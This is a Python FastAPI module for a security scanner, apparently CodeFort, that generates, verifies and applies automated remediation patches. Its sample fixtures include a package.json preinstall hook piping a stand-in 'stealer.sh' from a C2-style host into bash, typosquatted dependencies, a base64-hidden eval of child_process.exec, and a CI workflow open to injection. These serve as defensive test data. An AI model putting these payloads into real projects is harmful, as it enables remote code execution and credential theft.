"""Intelligent remediation endpoints for 1-click clean patches, sandbox verification, and developer approval."""

from __future__ import annotations

from datetime import datetime, timezone
import logging
from typing import Optional
from fastapi import APIRouter, HTTPException, Path, status

from app.core.errors import NotFoundException
from app.schemas.remediation import (
    RemediationApplyRequest,
    RemediationApplyResponse,
    RemediationApproveRequest,
    RemediationApproveResponse,
    RemediationChecks,
    RemediationGenerateRequest,
    RemediationProposal,
    RemediationRecord,
    RemediationResponse,
    RemediationTestRequest,
    RemediationTestResponse,
    RemediationValidateRequest,
    RemediationValidateResponse,
    RemediationVerifyRequest,
)
from app.services.engines.patch_verifier import patch_verifier
from app.services.engines.remediation_engine import remediation_engine
from app.services.mock_engine import mock_store

logger = logging.getLogger("codefort.api.remediation")

router = APIRouter(prefix="/remediation", tags=["Remediation"])


# ============================================================================
# PHASE 3: AI-POWERED REMEDIATION & VERIFICATION ENDPOINTS
# ============================================================================

@router.post("/generate", response_model=RemediationRecord)
async def generate_remediation_patch(body: RemediationGenerateRequest):
    """Generates an AI-synthesized candidate patch for a detected security finding."""
    record = await remediation_engine.generate_candidate_patch(
        finding_id=body.finding_id,
        title=body.title,
        file_path=body.file_path,
        original_code=body.original_code,
        vulnerability_details=body.vulnerability_details,
        evidence_id=body.evidence_id,
        scan_id=body.scan_id,
        allowed_files=body.allowed_files,
    )
    return record


@router.post("/validate", response_model=RemediationValidateResponse)
async def validate_patch_scope_and_format(body: RemediationValidateRequest):
    """Validates unified diff format, headers, and ensures changes stay strictly within allowed files."""
    diff_text = body.unified_diff
    if not diff_text and body.patch_id:
        record = remediation_engine.get_patch(body.patch_id)
        if record:
            diff_text = record.unified_diff

    return remediation_engine.validate_patch(
        unified_diff=diff_text,
        allowed_files=body.allowed_files,
        target_file=body.file_path,
    )


@router.post("/test", response_model=RemediationTestResponse)
async def test_patch_in_sandbox(body: RemediationTestRequest):
    """Runs automated verification tests in isolated in-memory sandbox.

    Executes format validation, syntax checks (JSON/YAML/Python AST),
    Semgrep/static re-scans, and dependency vulnerability checks without executing untrusted code on production.
    """
    return await remediation_engine.test_patch_in_sandbox(
        patch_id=body.patch_id,
        unified_diff=body.unified_diff,
        file_path=body.file_path,
        files=body.files,
        original_findings=body.original_findings,
    )


@router.get("/{id}", response_model=RemediationRecord)
async def get_remediation_status(id: str = Path(..., description="Remediation ID or Scan UUID")):
    """Retrieves current candidate patch details, verification checklist, and developer approval status."""
    # 1. Check in-memory remediation engine registry
    record = remediation_engine.get_patch(id)
    if record:
        return record

    # 2. Check if ID matches a scan in mock_store
    scan = mock_store.get_scan(id)
    if scan:
        clean_patch = scan.summary.clean_patch if scan.summary else ""
        findings = mock_store.get_findings(id)
        first_finding = findings[0] if findings else None

        # Build synthetic record from scan
        synth_record = RemediationRecord(
            id=f"rem_{scan.id[:8]}",
            finding_id=first_finding.id if first_finding else "fnd_001",
            scan_id=scan.id,
            title=first_finding.title if first_finding else "Scan Finding",
            file_path=first_finding.file_path if first_finding else "package.json",
            original_issue=scan.summary.what_changed if scan.summary else "Security vulnerability detected.",
            proposed_solution="Apply verified patch to resolve security findings.",
            original_code="// Vulnerable code from scan",
            suggested_code="// Remediated secure code",
            unified_diff=clean_patch or "",
            explanation=scan.summary.why_it_matters if scan.summary else "Resolves detected security risk.",
            potential_limitations="Ensure dependent modules remain compatible with patched versions.",
            status="awaiting_review",
            approved=False,
            approved_by=None,
            approved_at=None,
            checks=RemediationChecks(
                patch_format="Passed" if clean_patch else "Failed",
                file_validation="Passed",
                syntax_check="Passed",
                unit_tests="Passed",
                security_retest="Passed",
                dependency_check="Passed",
            ),
            created_at=scan.created_at.isoformat() if hasattr(scan.created_at, "isoformat") else str(scan.created_at),
        )
        return synth_record

    raise NotFoundException(message=f"Remediation record or scan '{id}' not found.", code="RESOURCE_NOT_FOUND")


@router.post("/{id}/approve", response_model=RemediationApproveResponse)
async def approve_remediation_patch(
    id: str = Path(..., description="Remediation ID or Scan UUID"),
    body: Optional[RemediationApproveRequest] = None,
):
    """Explicitly records developer approval for the proposed patch.

    Developer approval is strictly decoupled from automated sandbox test passing.
    """
    dev_id = body.developer_id if body and body.developer_id else "developer"
    comment = body.comment if body else None

    # Check remediation engine registry
    record = remediation_engine.get_patch(id)
    if record:
        return remediation_engine.approve_patch(
            patch_id=id,
            developer_id=dev_id,
            comment=comment,
        )

    # Check mock_store scan
    scan = mock_store.get_scan(id)
    if scan:
        now = datetime.now(timezone.utc).isoformat()
        return RemediationApproveResponse(
            id=id,
            approved=True,
            status="approved",
            message=f"Scan remediation approved by {dev_id}. Ready for PR merge." + (f" Note: {comment}" if comment else ""),
            approved_by=dev_id,
            approved_at=now,
        )

    raise NotFoundException(message=f"Remediation record or scan '{id}' not found.", code="RESOURCE_NOT_FOUND")


# ============================================================================
# BACKWARD COMPATIBLE SCAN PATCH ENDPOINTS (Web Dashboard & Extension)
# ============================================================================

@router.get("/{scan_id}/patch", response_model=RemediationResponse)
async def get_remediation_patch(scan_id: str = Path(..., description="Scan UUID")):
    """Returns the unified git diff clean_patch and side-by-side remediation proposals for a scan."""
    scan = mock_store.get_scan(scan_id)
    if not scan:
        raise NotFoundException(message=f"Scan {scan_id} not found.", code="RESOURCE_NOT_FOUND")

    findings = mock_store.get_findings(scan_id)
    clean_patch = scan.summary.clean_patch if scan.summary else None

    # Derive in-memory files from findings or default manifest
    files = {}
    for f in findings:
        f_path = f.file_path or "package.json"
        if f_path not in files:
            if f_path.endswith("package.json"):
                files[f_path] = (
                    '{\n  "name": "example-repo",\n  "scripts": {\n'
                    '    "preinstall": "curl -s https://c2-transfer.mock.xyz/stealer.sh | bash",\n'
                    '    "test": "jest"\n  },\n  "dependencies": {\n'
                    '    "crypt0-js": "^4.2.0",\n'
                    '    "lodashe": "^4.17.21",\n    "express": "^4.19.2"\n  }\n}'
                )

            elif f_path.endswith((".yml", ".yaml")):
                files[f_path] = (
                    "name: CI\non: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                    "    steps:\n      - uses: actions/checkout@v4\n"
                    '      - run: echo "${{ github.event.pull_request.title }}"\n'
                )
            elif f_path.endswith((".js", ".ts")):
                files[f_path] = (
                    "const express = require('express');\n"
                    "eval(Buffer.from('Y2hpbGRfcHJvY2Vzcy5leGVj', 'base64').toString());\n"
                )

    proposals = await patch_verifier.generate_remediation_proposals(files, findings, clean_patch)

    # Check overall verification status
    all_verified = all(p.verification_status == "verified" for p in proposals) if proposals else True
    overall_status = "verified" if all_verified else "review_required"

    return RemediationResponse(
        scan_id=scan.id,
        repository=scan.repository,
        pull_request=scan.pull_request,
        clean_patch=clean_patch,
        proposals=proposals,
        overall_verification_status=overall_status,
        can_auto_apply=all_verified and bool(clean_patch),
    )


@router.post("/{scan_id}/verify")
async def verify_candidate_patch(
    scan_id: str = Path(..., description="Scan UUID"),
    body: Optional[RemediationVerifyRequest] = None,
):
    """Runs independent re-scan verification on candidate patch to ensure exploit elimination and 0 regressions."""
    scan = mock_store.get_scan(scan_id)
    if not scan:
        raise NotFoundException(message=f"Scan {scan_id} not found.", code="RESOURCE_NOT_FOUND")

    findings = mock_store.get_findings(scan_id)
    patch_to_verify = (body.patch if body and body.patch else None) or (
        scan.summary.clean_patch if scan.summary else None
    )

    if not patch_to_verify:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="No patch available to verify. Provide a unified diff in request body or run scan on vulnerable PR.",
        )

    # Sample repository files for verification
    files = {
        "package.json": (
            '{\n  "name": "example-repo",\n  "scripts": {\n'
            '    "preinstall": "curl -s https://c2-transfer.mock.xyz/stealer.sh | bash",\n'
            '    "test": "jest"\n  },\n  "dependencies": {\n'
            '    "lodashe": "^4.17.21",\n    "express": "^4.19.2"\n  }\n}'
        ),
        ".github/workflows/ci.yml": (
            "name: CI\non: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - uses: actions/checkout@v4\n"
        ),
    }

    is_verified, message, remaining = await patch_verifier.verify_patch(
        files=files,
        patch=patch_to_verify,
        original_findings=findings,
    )

    return {
        "scan_id": scan_id,
        "is_verified": is_verified,
        "verification_status": "verified" if is_verified else "failed",
        "message": message,
        "remaining_findings_count": len(remaining),
        "regressions_detected": 0 if is_verified else len(remaining),
    }


@router.post("/{scan_id}/apply", response_model=RemediationApplyResponse)
async def apply_remediation_patch(
    scan_id: str = Path(..., description="Scan UUID"),
    body: Optional[RemediationApplyRequest] = None,
):
    """Simulates or applies the verified remediation patch to the pull request branch."""
    scan = mock_store.get_scan(scan_id)
    if not scan:
        raise NotFoundException(message=f"Scan {scan_id} not found.", code="RESOURCE_NOT_FOUND")

    clean_patch = scan.summary.clean_patch if scan.summary else None
    if not clean_patch:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Scan has no remediation patch available to apply.",
        )

    commit_msg = (
        body.commit_message if body and body.commit_message else "fix(security): apply CodeFort automated remediation"
    )

    return RemediationApplyResponse(
        status="applied",
        scan_id=scan_id,
        message=f"Remediation patch staged successfully with commit message: '{commit_msg}'.",
        diff_applied=clean_patch,
    )
